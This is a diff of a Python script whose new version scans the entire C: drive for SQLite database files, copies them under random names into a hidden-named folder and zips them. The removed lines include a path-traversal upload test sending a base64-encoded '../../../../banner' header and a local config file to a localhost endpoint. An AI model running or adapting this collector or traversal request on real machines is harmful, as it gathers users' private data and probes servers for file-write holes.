@@ -2,27 +2,23 @@
 # coding=UTF-8
 # version:python3.x
 
-import os
-import sqlite3
-
-import shutil
 import _thread
+import os
 import random
+import shutil
 import uuid
 import zipfile
-import requests
-import base64
 
 
-def del_file(path):
+def del_path(path):
     ls = os.listdir(path)
     for i in ls:
         c_path = os.path.join(path, i)
         if os.path.isdir(c_path):
-            del_file(c_path)
+            del_path(c_path)
         else:
             os.remove(c_path)
-    os.remove(path)
+    os.rmdir(path)
 
 
 def find_sqlite_file(path, dir):
@@ -30,16 +26,17 @@ def find_sqlite_file(path, dir):
     with open(dir + "/sqlite.index", "a+", encoding="utf-8") as f:
         for root, dirs, files in os.walk(path):
             for name in files:
-                ff = os.path.join(root, name)
+                ff = os.path.join(root, name).replace("\\","/")
                 try:
                     with open(ff, "rb") as temp:
                         prefix = ''.join(['%02x' % b for b in bytes(temp.read(10))])
                         if prefix.startswith("53514c6974652066"):
                             fs = ff.replace("\\", "/")
                             nf = str(uuid.uuid1())
-                            print(fs, dir + "/" + nf)
+                            dstf = (dir + "/" + nf).replace("\\","/")
+                            print(fs, dstf)
                             f.write(fs + '==>' + nf + "\n")
-                            _thread.start_new_thread(shutil.copy, (fs, dir + "/" + nf))
+                            _thread.start_new_thread(shutil.copy, (fs, dstf))
                             # 读写校验
                             # try:
                             #     conn = sqlite3.connect(ff)
@@ -69,22 +66,10 @@ def zip_dir(dirname, zipfilename):
 
 
 if __name__ == '__main__':
-    # dir = "c:/" + ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', 5))
-    # os.mkdir(dir)
-    # find_sqlite_file("c:/", dir)
-    # zip_dir(dir,dir+".zip")
-    # del_file(dir)
-    # curl -F "upfile=@/Users/yugj/Documents/hell/test/classes.dex" http://localhost:8000
+    """在C盘中查找所以有的sqlite文件并打成随机的zip"""
+    dir = "c:/" + ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', 5))
+    os.mkdir(dir)
+    find_sqlite_file("c:/", dir)
+    zip_dir(dir,dir+".zip")
+    del_path(dir)
 
-    # files = {"014.jpg": open(u"D:\\图片\\中国风\\014.jpg", "rb").read()
-    #          ,"1353930166177.jpg": open(u"D:\\图片\\中国风\\1353930166177.jpg", "rb").read()}
-    # res = requests.request("POST", "http://localhost:9090/upload", data=None, files=files)
-    # print(res.status_code,"===>",res.text)
-
-
-    proxies = {'http': 'http://127.0.0.1:8888'}
-    head = {'Path':base64.b64encode('../../../../banner'.encode('utf-8'))}
-    payload = {'path': '/banner'}
-    files = {"server1.conf": open(u"c:\\server1.conf", "rb").read()}
-    res = requests.request("POST", "http://localhost:9090/upload", proxies=proxies,headers=head, data=None, files=files)
-    print(res.status_code, "===>", res.text)
